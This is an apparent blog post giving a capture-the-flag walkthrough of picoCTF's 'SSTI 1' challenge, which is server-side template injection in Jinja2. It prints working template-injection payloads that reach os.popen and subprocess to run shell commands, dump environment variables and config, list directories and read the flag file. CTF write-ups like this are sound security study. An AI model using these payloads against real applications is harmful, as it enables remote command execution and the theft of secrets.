---
slug: "picoctf-ssti-jinja2"
title: "picoCTF SSTI 1: Server-Side Template Injection in Jinja2"
date: "2025-10-07"
category: "ctf"
tags:
  - "CTF"
  - "Web Security"
  - "picoCTF"
  - "SSTI"
excerpt: "{{7*7}} confirms Jinja2. From there, walking Python's object model to read the flag when direct command execution is blocked."
readTime: "2 min"
featured: true
---

PICOCTF Server-Side-Template-Injection 1

![picoCTF SSTI 1: Server-Side Template Injection in Jinja2 — figure 1](/images/blog/picoctf-ssti-jinja2/figure1.png)

On load was this:

tried basic SSTI payloads to see what happens

```
{{7*7}}
```

![picoCTF SSTI 1: Server-Side Template Injection in Jinja2 — figure 2](/images/blog/picoctf-ssti-jinja2/figure2.png)

payload is executed which confirms Jinja 2 – a commonly used python flask aplication

With this in mind, I tried to do some command injection see if we can get the flag

```
I tried the following payloads
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() }}
```

## - it returned blank

second payloads

```
{{ self.__init__.__globals__.os.popen('cat /flag').read() }}
```

it generated an internal error

![picoCTF SSTI 1: Server-Side Template Injection in Jinja2 — figure 3](/images/blog/picoctf-ssti-jinja2/figure3.png)

3rd time is always a charm

```
{{''.__class__.mro()[1].__subclasses__()[408]('cat /flag',shell=True,stdout=-1).communicate()[0]}}
```

it also gave an error

just to give you an idea of what these payloads are trying to do,

```
they exploit Python's object model to access os.popen() or subprocess.Popen(), which let you execute shell commands like cat /flag.
```

Since we  don’t see any output or the app crashes, the sandbox might block command execution. But we can still try reading config variables or templates.

So how do we proceed;

Step 1: Discover Available Python Classes

```
{{''.__class__.mro()[1].__subclasses__()}}
```

output is as below

![picoCTF SSTI 1: Server-Side Template Injection in Jinja2 — figure 4](/images/blog/picoctf-ssti-jinja2/figure4.png)

this shows that the subprocess is available but commands are being blocked.

Next I tried to dump Access Config Info

If commands are blocked, try dumping Flask config:

```
{{ config.items() }}
```

![picoCTF SSTI 1: Server-Side Template Injection in Jinja2 — figure 5](/images/blog/picoctf-ssti-jinja2/figure5.png)

Up to this point we have done a good done solid recon:

## ✅ SSTI is confirmed.

## ✅ subprocess.Popen is available.

## ✅ Config values are exposed, but no flag yet.

## Next Step: Look Deeper into the Globals

We’ll now try to leak other variables or open files using the Jinja2 environment.

### 🔍 Step 1: Try Accessing os.environ

Sometimes flags are stored in environment variables like FLAG, APP_FLAG

```
{{ config.__class__.__init__.__globals__['os'].environ }}
```

![picoCTF SSTI 1: Server-Side Template Injection in Jinja2 — figure 6](/images/blog/picoctf-ssti-jinja2/figure6.png)

### Step 2: List Directory to Find Flag File

If os.listdir() works:

```
{{ config.__class__.__init__.__globals__['os'].listdir('/') }}
```

![picoCTF SSTI 1: Server-Side Template Injection in Jinja2 — figure 7](/images/blog/picoctf-ssti-jinja2/figure7.png)

Now this is something we can work with,

Perfect — we now know:

The current working directory is /challenge ('PWD': '/challenge')

The flag is not in environment variables

The / directory contains a folder named /challenge, which is highly likely to contain the flag

## ✅ Step 3: List Files in /challenge

Try this payload:

```
{{ config.__class__.__init__.__globals__['os'].listdir('/challenge') }}
```

![picoCTF SSTI 1: Server-Side Template Injection in Jinja2 — figure 8](/images/blog/picoctf-ssti-jinja2/figure8.png)

And behold we found our flag lurking around in the current working directory

so now we need one last payload to expose the flag,

```
{{ config.__class__.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
```

and we got it. Hurray!!!

![picoCTF SSTI 1: Server-Side Template Injection in Jinja2 — figure 9](/images/blog/picoctf-ssti-jinja2/figure9.png)

this was an easy one from PicoCTF and worth mentioning that there are numerous ways to solve it once you understand the working s of SSTI
